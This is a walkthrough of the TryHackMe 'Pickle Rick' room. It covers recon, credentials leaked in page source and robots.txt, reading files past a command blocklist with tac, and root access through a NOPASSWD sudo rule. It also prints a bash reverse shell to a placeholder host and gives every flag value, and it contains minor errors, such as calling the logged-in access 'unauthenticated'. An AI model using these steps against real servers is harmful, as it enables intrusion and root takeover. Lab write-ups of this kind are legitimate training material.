# Pickle Rick — TryHackMe Writeup

**Room:** https://tryhackme.com/room/picklerick
**Difficulty:** Easy
**Category:** Source Code Analysis · robots.txt · Directory Enumeration · Command Injection · Sudo Abuse

> *"This Rick and Morty-themed challenge requires you to exploit a web server and find three secret ingredients to help Rick make his potion to transform himself back into a human from a pickle."*

---

## Ingredients (Flags)

| Ingredient | Value |
|------------|-------|
| First Ingredient  | `mr. meeseek hair` |
| Second Ingredient | `1 jerry tear` |
| Third Ingredient  | `fleeb juice` |

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial 10.10.135.192
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports: SSH (22) and HTTP (80). No SSH credentials yet, so web enumeration is the starting point.

---

## 2. Web Enumeration — Credentials Hidden in Plain Sight

### Page Source — Username Leak

Visiting `http://10.10.135.192/` shows Rick's plea for help, but the **HTML source** contains a comment left by a careless developer:

```html
<!--
  Note to self, remember username!
  Username: R1ckRul3s
-->
```

**Username found: `R1ckRul3s`**

### robots.txt — Password Leak

Checking `robots.txt` before running any fuzzer is a quick win:

```
http://10.10.135.192/robots.txt
```

```
Wubbalubbadubdub
```

Not a disallow list — just the string `Wubbalubbadubdub` sitting alone. Given the username in the source, this is almost certainly the password.

**Password found: `Wubbalubbadubdub`**

### Directory Enumeration

```bash
gobuster dir -u http://10.10.135.192 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x .php,.html,.txt \
  -o gobuster.log
```

```
/login.php     (Status: 200)
/portal.php    (Status: 302) --> /login.php
/robots.txt    (Status: 200)
/assets        (Status: 301)
```

`/portal.php` exists but redirects to `/login.php` before authentication. `/assets/` is browseable and contains page resources but nothing exploitable directly.

---

## 3. Login and Command Panel

Navigating to `http://10.10.135.192/login.php` and entering `R1ckRul3s` / `Wubbalubbadubdub` grants access to `/portal.php` — a web-based command panel that executes shell commands directly on the server.

Confirm execution with a basic test:

```bash
whoami
```

```
www-data
```

We have unauthenticated code execution as `www-data`.

---

## 4. First Ingredient

List the web root:

```bash
ls -la
```

```
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1062 Feb 10  2019 denied.php
drwxrwxrwx 2 root   root   4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

`Sup3rS3cretPickl3Ingred.txt` is right there. However, `cat` is blocked by the portal:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

```
Command disabled to make this hard for you!
```

The blocked commands are revealed by reading the portal source:

```bash
tac portal.php
```

```php
$cmds = array("cat", "head", "more", "tail", "nano", "vim", "vi");
```

`tac` (reverse `cat`) is not in the blocklist. Use it instead:

```bash
tac Sup3rS3cretPickl3Ingred.txt
```

```
mr. meeseek hair
```

Also check `clue.txt`:

```bash
tac clue.txt
```

```
Look around the file system for the other ingredient.
```

**First Ingredient: `mr. meeseek hair`**

---

## 5. Second Ingredient

The clue points to the broader filesystem. Check the home directory:

```bash
ls -la /home/rick
```

```
total 12
drwxrwxrwx 2 rick rick 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 rick rick   13 Feb 10  2019 second ingredients
```

The filename has a space — quote it:

```bash
tac "/home/rick/second ingredients"
```

```
1 jerry tear
```

**Second Ingredient: `1 jerry tear`**

---

## 6. Third Ingredient — Root Required

Checking `sudo` privileges:

```bash
sudo -l
```

```
Matching Defaults entries for www-data on ip-10-10-135-192.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on ip-10-10-135-192.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

`www-data` can run **any command as root with no password**. This is complete privilege escalation without any exploit needed.

```bash
sudo ls /root
```

```
3rd.txt
snap
```

```bash
sudo tac /root/3rd.txt
```

```
fleeb juice
```

**Third Ingredient: `fleeb juice`**

---

## 7. Bonus — Stable Reverse Shell

The command panel works but is awkward. Getting a proper reverse shell for easier navigation:

```bash
# On attacker
nc -lnvp 4444

# In the command panel
bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
```

Since `www-data` can run anything as root with no password, escalating immediately from the reverse shell:

```bash
sudo bash
root@ip-10-10-135-192:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Full Command Reference

All commands used in the command panel, in order:

```bash
whoami
ls -la
tac Sup3rS3cretPickl3Ingred.txt
tac clue.txt
tac portal.php
ls -la /home/rick
tac "/home/rick/second ingredients"
sudo -l
sudo ls /root
sudo tac /root/3rd.txt
```

---

## Key Learnings

- **HTML source comments are credentials** — developers frequently leave usernames, notes, and hints in HTML comments during development and forget to remove them. `Ctrl+U` (view source) is free reconnaissance.
- **`robots.txt` is always worth checking first** — it takes two seconds and often reveals hidden paths, disallowed directories, or — as here — literal credentials sitting in the file.
- **`cat` alternatives exist for every blocklist** — `tac` (reverse cat), `less`, `more`, `head`, `tail`, `strings`, `od`, `xxd`, Python one-liners, and `base64 | base64 -d` all read file contents. Blocklists that only target `cat` provide no real security.
- **Read portal/app source via the panel itself** — `tac portal.php` exposed the exact blocked command list, making it trivial to pick an unlisted alternative. The app's own code is in the web root and accessible to the execution environment.
- **`sudo (ALL) NOPASSWD: ALL` is the most dangerous sudoers line possible** — it grants the user unconditional root without a password for every command. This is almost certainly a CTF-specific misconfiguration, but it's seen in real misconfigured systems where developers want to "simplify" deployments.
- **Filenames with spaces need quoting** — `tac /home/rick/second ingredients` fails silently; `tac "/home/rick/second ingredients"` works. Always quote paths when filenames contain spaces.

## Conclusion

Pickle Rick is a focused beginner room that teaches three core habits in one compact session: check source code, check `robots.txt`, and check `sudo -l`. Each one of those steps yields a critical piece of information — a username, a password, and total root access respectively. The blocked `cat` command adds a single layer of friction that teaches the important lesson that security-by-blocklist is fragile; for every blocked command, there are always several equivalents that aren't. The room is deliberately simple, but the habits it builds are foundational to every web CTF that follows.
